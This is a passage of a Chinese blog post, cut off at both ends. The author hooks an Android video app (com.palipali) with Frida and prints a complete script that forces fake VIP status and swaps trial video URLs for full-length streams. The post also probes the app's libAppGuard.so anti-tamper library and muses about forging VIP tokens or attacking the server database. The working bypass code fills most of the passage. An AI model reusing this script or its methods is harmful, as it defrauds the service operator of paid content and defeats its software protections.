class="attr">&quot;level&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span>        <span class="comment">// 真实账号是非 VIP</span></span><br><span class="line">  <span class="attr">&quot;is_vip&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;vip_expiry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>解决方案有哪些</p><ol><li><p>Hook 收藏接口的 <strong>请求参数</strong> —— 伪造 VIP token</p><p>若收藏接口需要带 token：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /favorite</span><br><span class="line">token=xxxxxx</span><br><span class="line">video_id=123</span><br></pre></td></tr></table></figure><p>可以 Hook OkHttp &#x2F; retrofit，把 token 换成一个真正 VIP 的 token（需要你自己有 VIP 账号）。</p><p>缺点：需要一个 VIP 账号。</p><blockquote><p>有点脱裤子放屁了</p></blockquote></li><li><p>Hook OkHttp，让收藏接口永远“本地成功”</p><p>跟之前hook本地model一样</p></li><li><p>Hook retrofit&#x2F;okhttp，劫持整个后端返回，伪造 ResponseUserInfo</p><p>这样整个 app 都以为你是真 VIP，<strong>甚至收藏接口服务器也不会再拒绝</strong>（因为它会读取 local token？取决于接口）。</p><p>但通常收藏&#x2F;点赞是根据真实服务器账号认证，不是本地字段。</p><p> 即便伪造本地 ResponseUserInfo，服务器还是知道：</p><blockquote><p>user_id&#x3D;12345 的账号不是 VIP</p></blockquote></li></ol><p>没啥用</p><p>总代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (pathptr) &#123;</span><br><span class="line">                <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[dlopen] load =&gt; &quot;</span> + path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_JNI_OnLoad</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libAppGuard.so&quot;</span>)</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x32ADC</span>), &#123;</span><br><span class="line">        <span class="title function_">onEnter</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;call JNI_OnLoad&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen2</span>(<span class="params">soName = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();</span><br><span class="line">                    <span class="keyword">if</span> (path.<span class="title function_">indexOf</span>(soName) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">is_can_hook</span> = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">is_can_hook</span>) &#123;</span><br><span class="line">                    <span class="title function_">hook_JNI_OnLoad</span>()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">setImmediate</span>(hook_dlopen2, <span class="string">&quot;libAppGuard.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// hook_dlopen();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_user</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">User</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.palipali.model.response.ResponseUserInfo&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hooking ResponseUserInfo ...&quot;</span>);</span><br><span class="line">        <span class="comment">// 强制 vipTrial = true</span></span><br><span class="line">        <span class="comment">// User.setVipTrial.implementation = function (v) &#123;</span></span><br><span class="line">        <span class="comment">//     console.log(&quot;[VIP] force vipTrial = true&quot;);</span></span><br><span class="line">        <span class="comment">//     return this.setVipTrial(true);</span></span><br><span class="line">        <span class="comment">// &#125;;</span></span><br><span class="line">        <span class="comment">// 强制 level = 2 尊荣VIP</span></span><br><span class="line">        <span class="title class_">User</span>.<span class="property">setLevel</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIP] force level = 2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setLevel</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 强制 expiry（有效期拉满）</span></span><br><span class="line">        <span class="title class_">User</span>.<span class="property">setExpiry</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIP] force expiry = 9999999999999&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setExpiry</span>(<span class="number">1799999999</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 强制试用</span></span><br><span class="line">        <span class="comment">// User.setTrialResult.implementation = function (v) &#123;</span></span><br><span class="line">        <span class="comment">//     console.log(&quot;[VIP] force trialResult = true&quot;);</span></span><br><span class="line">        <span class="comment">//     return this.setTrialResult(true);</span></span><br><span class="line">        <span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 App 有读取 showVipTime 也顺便设成 300 秒</span></span><br><span class="line">        <span class="comment">// User.setShowVipTime.implementation = function (v) &#123;</span></span><br><span class="line">        <span class="comment">//     console.log(&quot;[VIP] force showVipTime = 300&quot;);</span></span><br><span class="line">        <span class="comment">//     return this.setShowVipTime(3000);</span></span><br><span class="line">        <span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">User</span>.<span class="property">toString</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[UserInfo] &quot;</span> + ret);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;    level        =&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">getLevel</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;    vipTrial     =&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">getVipTrial</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;    expiry       =&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">getExpiry</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;    trialResult  =&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">getTrialResult</span>());</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_response_vip</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Info</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.palipali.model.response.ResponseVideoInfo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hooking ResponseVideoInfo...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印 video_duration（总时长）</span></span><br><span class="line">    <span class="title class_">Info</span>.<span class="property">getVideo_duration</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = <span class="variable language_">this</span>.<span class="title function_">getVideo_duration</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIDEO] getVideo_duration =&quot;</span>, d);</span><br><span class="line">        <span class="keyword">return</span> d;   <span class="comment">// 不修改</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印 video_end（试看截止点）</span></span><br><span class="line">    <span class="title class_">Info</span>.<span class="property">getVideo_end</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> end = <span class="variable language_">this</span>.<span class="title function_">getVideo_end</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIDEO] getVideo_end =&quot;</span>, end);</span><br><span class="line">        <span class="keyword">return</span> end; <span class="comment">// 不修改</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印 setVideo_end（服务器写入的限制）</span></span><br><span class="line">    <span class="title class_">Info</span>.<span class="property">setVideo_end</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIDEO] setVideo_end called, value =&quot;</span>, v);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setVideo_end</span>(v);  <span class="comment">// 不修改</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_response_url</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Url</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.palipali.model.response.ResponseVideoUrl&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hooking ResponseVideoUrl with auto full URL...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> url_240 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> url_480 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">Url</span>.<span class="property">getIntroUrl</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> intro = <span class="variable language_">this</span>.<span class="title function_">getIntroUrl</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] intro =&quot;</span>, intro);</span><br><span class="line">        <span class="keyword">var</span> filename = intro.<span class="title function_">substring</span>(intro.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] extracted filename =&quot;</span>, filename);</span><br><span class="line">        <span class="keyword">if</span>(filename)&#123;</span><br><span class="line">            url_240 = <span class="string">&quot;/media/240/&quot;</span> + filename;</span><br><span class="line">            url_480 = <span class="string">&quot;/media/480/&quot;</span> + filename;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] FULL video =&quot;</span>, url_240);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] FULL video 480  =&quot;</span>, url_480);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">setQvgaUrl</span>(url_240);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">setVgaUrl</span>(url_480);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] qvgaUrl overridden to FULL&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intro; </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Url</span>.<span class="property">getQvgaUrl</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> q = <span class="variable language_">this</span>.<span class="title function_">getQvgaUrl</span>();</span><br><span class="line">        <span class="keyword">if</span> (url_240) q = url_240;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] qvga =&quot;</span>, q);</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Url</span>.<span class="property">getVgaUrl</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vga = <span class="variable language_">this</span>.<span class="title function_">getVgaUrl</span>();</span><br><span class="line">        <span class="keyword">var</span> q = <span class="variable language_">this</span>.<span class="title function_">getQvgaUrl</span>();</span><br><span class="line">        <span class="keyword">var</span> filename = q.<span class="title function_">substring</span>(q.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] extracted filename =&quot;</span>, filename);</span><br><span class="line">        <span class="keyword">if</span> (filename) url_480 = <span class="string">&quot;/media/480/&quot;</span> + filename;</span><br><span class="line">        <span class="keyword">if</span> (url_480) vga = url_480;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] vga =&quot;</span>, vga);</span><br><span class="line">        <span class="keyword">return</span> vga;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_missing_video_urls</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Info</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.palipali.model.response.ResponseVideoInfo&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Url</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.palipali.model.response.ResponseVideoUrl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hooking fallback URL generator...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Info</span>.<span class="property">getVideo_urls</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> urls = <span class="variable language_">this</span>.<span class="title function_">getVideo_urls</span>();</span><br><span class="line">            <span class="keyword">var</span> vid = <span class="variable language_">this</span>.<span class="title function_">getVideo_id</span>();   <span class="comment">// 关键字段：video_id，例如 &quot;123&quot;</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ID:&quot;</span>  + vid);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!vid || vid.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] video_id missing, return raw urls&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> urls;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 原始 URL（intro/qvga/vga）</span></span><br><span class="line">            <span class="keyword">var</span> intro = urls.<span class="title function_">getIntroUrl</span>();</span><br><span class="line">            <span class="keyword">var</span> qvga  = urls.<span class="title function_">getQvgaUrl</span>();</span><br><span class="line">            <span class="keyword">var</span> vga   = urls.<span class="title function_">getVgaUrl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果三者中有一个为空，即需要补全</span></span><br><span class="line">            <span class="keyword">if</span> (!intro &amp;&amp; !qvga &amp;&amp; !vga) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] Missing URLs for video:&quot;</span>, vid);</span><br><span class="line">                <span class="keyword">var</span> file = vid + <span class="string">&quot;.m3u8&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> url240 = <span class="string">&quot;/media/240/&quot;</span> + file;</span><br><span class="line">                <span class="keyword">var</span> url480 = <span class="string">&quot;/media/480/&quot;</span> + file;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] fallback 240 =&quot;</span>, url240);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] fallback 480 =&quot;</span>, url480);</span><br><span class="line"></span><br><span class="line">                urls.<span class="title function_">setQvgaUrl</span>(url240);</span><br><span class="line">                urls.<span class="title function_">setVgaUrl</span>(url480);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// intro 可选：有些逻辑会读取</span></span><br><span class="line">                urls.<span class="title function_">setIntroUrl</span>(url240);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(intro)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] Missing URLs for video:&quot;</span>, vid);</span><br><span class="line">                <span class="keyword">var</span> file = vid + <span class="string">&quot;.m3u8&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> url240 = <span class="string">&quot;/media/240/&quot;</span> + file;</span><br><span class="line">                <span class="keyword">var</span> url480 = <span class="string">&quot;/media/480/&quot;</span> + file;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] fallback 240 =&quot;</span>, url240);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VID] fallback 480 =&quot;</span>, url480);</span><br><span class="line"></span><br><span class="line">                urls.<span class="title function_">setQvgaUrl</span>(url240);</span><br><span class="line">                urls.<span class="title function_">setVgaUrl</span>(url480);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> urls;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hook_user</span>();</span><br><span class="line">    <span class="title function_">hook_response_vip</span>();</span><br><span class="line">    <span class="comment">// hook_response_url();</span></span><br><span class="line">    <span class="title function_">hook_missing_video_urls</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可能要改数据库只能渗透了hhh</p><p>渗透有空再学吧</p><h2 id="Xpoed模块编写-失败"><a href="#Xpoed模块编写-失败" class="headerlink" title="Xpoed模块编写 [失败]"></a>Xpoed模块编写 [失败]</h2><p>到此为止想收个尾，写个模块</p><p>没想到直接被kill了</p><p>因为没找到如何定位哪kill的，找了很久，看了挺多博客都是java层的</p><p>但是java层没发现什么，后面猜测是native层的</p><p>直接找so</p><p>发现了可以文件libAppGuard.so</p><p>似乎有反调但不确定</p><p>ida分析，发现这几个函数</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511222159595.png" alt="image-20251122215950382"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511222200887.png" alt="image-20251122220007679"></p><p>是检测，但是a1点进去只是个偏移并不知道是对什么做了匹配</p><blockquote><p>猜测是xposed这种?因为使用frida并没有出现这个情况</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 